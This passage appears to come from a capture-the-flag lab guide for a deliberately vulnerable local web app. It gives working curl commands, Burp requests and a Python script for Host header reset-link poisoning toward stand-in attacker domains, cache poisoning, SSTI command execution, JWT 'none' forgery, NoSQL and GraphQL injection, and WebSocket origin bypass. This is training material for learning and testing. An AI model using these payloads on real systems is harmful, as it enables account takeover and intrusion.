3. **Check response headers:**
```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
X-Cache: MISS
```

4. **Send request again to populate cache:**
```http
X-Cache: HIT
```

5. **All subsequent users receive the poisoned response**

**Burp Suite Intruder for Cache Poisoning:**
1. Send request to Intruder
2. Set payload position on Host header:
```http
Host: §attacker.evil.com§
```
3. Payloads:
   - `attacker.evil.com`
   - `evil.com"><script>alert(1)</script>`
   - `localhost:5000@attacker.evil.com`
4. Monitor for successful cache poisoning

#### Step 5: Automated Exploitation Script
**Objective:** Automate the password reset poisoning attack

**Python Script for Host Header Injection:**
```python
import requests
import time

def exploit_host_header_injection(target_email, evil_host):
    url = "http://localhost:5000/api/vuln/host-header-injection"
    
    headers = {
        "Host": evil_host,
        "Content-Type": "application/json"
    }
    
    payload = {
        "email": target_email
    }
    
    print(f"[*] Sending poisoned password reset request...")
    print(f"[*] Target email: {target_email}")
    print(f"[*] Malicious host: {evil_host}")
    
    response = requests.post(url, json=payload, headers=headers)
    
    if response.status_code == 200:
        result = response.json()
        print(f"[+] Success! Reset link poisoned:")
        print(f"[+] {result.get('resetLink')}")
        
        if evil_host in result.get('resetLink', ''):
            print(f"[+] Host header injection successful!")
            print(f"[+] Flag: {result.get('flag')}")
            return True
    
    print(f"[-] Exploitation failed")
    return False

def test_various_injection_methods(target_email):
    test_cases = [
        ("attacker.evil.com", "Basic Host header replacement"),
        ("localhost:5000@attacker.evil.com", "Port-based injection"),
        ("evil.com:80#@localhost:5000", "Fragment injection"),
        ("evil.com%23@localhost:5000", "URL-encoded injection"),
    ]
    
    for malicious_host, description in test_cases:
        print(f"\n[*] Testing: {description}")
        exploit_host_header_injection(target_email, malicious_host)
        time.sleep(1)

if __name__ == "__main__":
    test_various_injection_methods("victim@bank.com")
```

#### Step 6: Capture the Flag
**Objective:** Complete the exploitation and retrieve the flag

1. Successfully poison the password reset link
2. Verify the email preview shows your malicious domain
3. **Flag reward:** `{HOST_HEADER_INJECTION_PASSWORD_RESET_POISONED}`

**Burp Suite Verification:**
```http
POST /api/vuln/host-header-injection HTTP/1.1
Host: hacker.evil.com
Content-Type: application/json

{"email":"admin@bank.com"}
```

**Expected Response:**
```json
{
  "success": true,
  "message": "Password reset email sent",
  "resetLink": "http://hacker.evil.com/reset?token=xyz789",
  "flag": "{HOST_HEADER_INJECTION_PASSWORD_RESET_POISONED}"
}
```

### Real-World Attack Scenarios

**Scenario 1: Credential Harvesting**
1. Attacker sends poisoned reset request with Host: attacker.com
2. Victim receives email with link to attacker.com
3. Victim clicks link, token sent to attacker's server
4. Attacker uses token to reset victim's password

**Scenario 2: Mass Cache Poisoning**
1. Attacker poisons CDN cache with malicious Host header
2. All users receive cached response with XSS payload
3. Widespread account compromise

**Scenario 3: Multi-Tenant Bypass**
1. SaaS application uses Host header for tenant identification
2. Attacker manipulates Host header to access other tenants
3. Cross-tenant data exposure

### Advanced Prevention Measures
1. Never use Host header for security-sensitive operations
2. Use absolute URLs with hardcoded domains
3. Validate Host header against whitelist
4. Implement proper virtual host configuration
5. Use HSTS (HTTP Strict Transport Security)
6. Configure web servers to reject ambiguous requests
7. Implement domain pinning for password reset links
8. Use separate domains for administrative functions
9. Monitor for unusual Host header values
10. Implement rate limiting on password reset endpoints

---

## Intermediate Lab Bypass Techniques

### Overview
All intermediate labs include at least one bypass method designed for intermediate-level complexity. These bypass techniques simulate real-world scenarios where simple exploitation is blocked by security controls.

### 1. Server-Side Template Injection (SSTI) Bypass Methods

#### Bypass Method 1: Alternate Delimiter Bypass
**Vulnerability:** WAF blocks standard `{{...}}` delimiters  
**Bypass:** Use alternate `{%...%}` delimiters

**Exploitation:**
```bash
# Standard payload (may be blocked)
curl "http://localhost:5000/api/vuln/ssti?template={{7*7}}"

# Bypass using alternate delimiters
curl "http://localhost:5000/api/vuln/ssti?template={%print(7*7)%}"
# Flag: {SSTI_WAF_BYPASS_ALTERNATE_DELIMITERS}
```

#### Bypass Method 2: Attribute Chain Bypass
**Vulnerability:** Filters block direct RCE keywords  
**Bypass:** Use attribute chaining to access dangerous functions

**Exploitation:**
```bash
# Use Python attribute chaining
curl "http://localhost:5000/api/vuln/ssti?template={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
# Flag: {SSTI_FILTER_BYPASS_ATTRIBUTE_CHAIN}
```

### 2. JWT Manipulation Bypass Method

#### Bypass Method: "none" Algorithm Bypass
**Vulnerability:** Server accepts unsigned JWTs with alg="none"  
**Bypass:** Remove signature and set algorithm to "none"

**Exploitation:**
```bash
# Original JWT header (base64): {"alg":"HS256","typ":"JWT"}
# Change to: {"alg":"none","typ":"JWT"}
# Base64 encode: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Original payload (base64): {"sub":"1234567890","name":"Guest","admin":false}
# Change to: {"sub":"1234567890","name":"Guest","admin":true}
# Base64 encode: eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9

# Construct token without signature (note the trailing dot)
curl "http://localhost:5000/api/vuln/jwt-manipulation?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9."
# Flag: {JWT_NONE_ALGORITHM_BYPASS}
```

### 3. NoSQL Injection Bypass Methods

#### Bypass Method 1: $gt Operator
**Vulnerability:** Basic $ne blocked but $gt allowed  
**Bypass:** Use greater-than operator for authentication bypass

**Exploitation:**
```bash
curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$gt":""}'
# Flag: {NOSQL_GT_OPERATOR_BYPASS}
```

#### Bypass Method 2: $regex Operator
**Vulnerability:** Regex operators not sanitized  
**Bypass:** Use regex for pattern-based authentication bypass

**Exploitation:**
```bash
curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$regex":"^a"}'
# Flag: {NOSQL_REGEX_INJECTION}
```

#### Bypass Method 3: $where JavaScript Execution
**Vulnerability:** $where clause allows JavaScript execution  
**Bypass:** Inject JavaScript code for authentication bypass

**Exploitation:**
```bash
curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$where":"1==1"}'
# Flag: {NOSQL_WHERE_CODE_EXECUTION}
```

### 4. GraphQL Injection Bypass Methods

#### Bypass Method 1: Introspection Query
**Vulnerability:** Introspection not disabled in production  
**Bypass:** Query schema to discover hidden fields

**Exploitation:**
```bash
curl 'http://localhost:5000/api/vuln/graphql-injection?query={__schema{types{name}}}'
# Flag: {GRAPHQL_INTROSPECTION_BYPASS}
```

#### Bypass Method 2: Query Batching
**Vulnerability:** Multiple queries allowed in single request  
**Bypass:** Batch multiple queries to extract more data

**Exploitation:**
```bash
curl 'http://localhost:5000/api/vuln/graphql-injection?query=[{users{id}},{posts{title}}]'
# Flag: {GRAPHQL_BATCH_QUERY_BYPASS}
```

#### Bypass Method 3: Deep Nesting / Depth Limit Bypass
**Vulnerability:** No query depth limits enforced  
**Bypass:** Use deeply nested queries to access sensitive data

**Exploitation:**
```bash
curl 'http://localhost:5000/api/vuln/graphql-injection?query={users{posts{comments{author{posts{comments{id}}}}}}}'
# Flag: {GRAPHQL_DEPTH_LIMIT_BYPASS}
```

#### Bypass Method 4: __typename Field Suggestion
**Vulnerability:** Type information exposes sensitive fields  
**Bypass:** Use __typename to discover field types

**Exploitation:**
```bash
curl 'http://localhost:5000/api/vuln/graphql-injection?query={users{id,username,__typename}}'
# Flag: {GRAPHQL_TYPENAME_DISCLOSURE}
```

### 5. WebSocket Manipulation Bypass Method

#### Bypass Method: Origin Validation Bypass
**Vulnerability:** Weak origin validation using substring check  
**Bypass:** Use domain with "trusted" substring

**Exploitation Using Burp Suite:**
1. Intercept WebSocket upgrade request
2. Modify Origin header to: `http://evil.trusted.com` or `http://trusted-attacker.com`
3. Server accepts connection due to substring match
4. Flag: {WEBSOCKET_ORIGIN_VALIDATION_BYPASS}

### 6. HTTP Host Header Injection Bypass Methods

#### Bypass Method 1: X-Forwarded-Host Header
**Vulnerability:** Application trusts X-Forwarded-Host over Host  
**Bypass:** Use X-Forwarded-Host to poison reset links

**Exploitation Using Burp Suite:**
1. Intercept password reset request
2. Add header: `X-Forwarded-Host: attacker.com`
3. Server uses X-Forwarded-Host in reset link
4. Flag: {HOST_HEADER_X_FORWARDED_HOST_BYPASS}

**Using curl:**
```bash
curl -X POST "http://localhost:5000/api/vuln/host-header-injection/reset" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Host: evil.com" \
  -d '{"email":"victim@company.com"}'
```

#### Bypass Method 2: X-Original-Host Header
**Vulnerability:** Alternative header not sanitized  
**Bypass:** Use X-Original-Host header

**Exploitation:**
```bash
curl -X POST "http://localhost:5000/api/vuln/host-header-injection/reset" \
  -H "Content-Type: application/json" \
  -H "X-Original-Host: attacker.com" \
  -d '{"email":"victim@company.com"}'
# Flag: {HOST_HEADER_X_ORIGINAL_HOST_BYPASS}
```

### 7. Labs with Existing Bypass Methods

The following labs already include intermediate-level bypass methods:

**LDAP Injection:**
- Wildcard bypass: `username=*` bypasses authentication
- Flag: {LDAP_INJECTION_WILDCARD_BYPASS}

**Advanced CSRF:**
- SameSite=None cookie bypass allows cross-site requests
- Flag: {CSRF_SAMESITE_BYPASS}

**Race Condition:**
- TOCTOU (Time-of-check-time-of-use) exploitation
- Flag: {RACE_CONDITION_EXPLOITED_MULTIPLE_USES}

---

## Advanced Testing Tools and Techniques

### Automated Testing Tools
1. **SQLMap** - Advanced SQL injection automation
2. **XSSStrike** - Advanced XSS detection and exploitation
3. **Commix** - Command injection exploitation
4. **XXEinjector** - Advanced XXE exploitation
5. **Custom Python scripts** - Tailored exploitation tools

### Burp Suite Professional Extensions
1. **JWT Editor** - JSON Web Token manipulation
2. **Collaborator Everywhere** - Out-of-band vulnerability detection
3. **Hackvertor** - Advanced encoding and evasion
4. **Turbo Intruder** - High-speed attack automation
5. **Content Type Converter** - Advanced content manipulation

### Advanced Methodology
1. **Reconnaissance Phase** - Deep application analysis
2. **Vulnerability Chaining** - Combine multiple vulnerabilities
3. **Evasion Techniques** - Bypass modern security controls
4. **Persistence Methods** - Maintain access after exploitation
5. **Data Exfiltration** - Advanced data extraction techniques

---

**Remember:** These advanced techniques require extensive knowledge and should only be used in authorized testing environments. Always ensure proper authorization and follow responsible disclosure practices.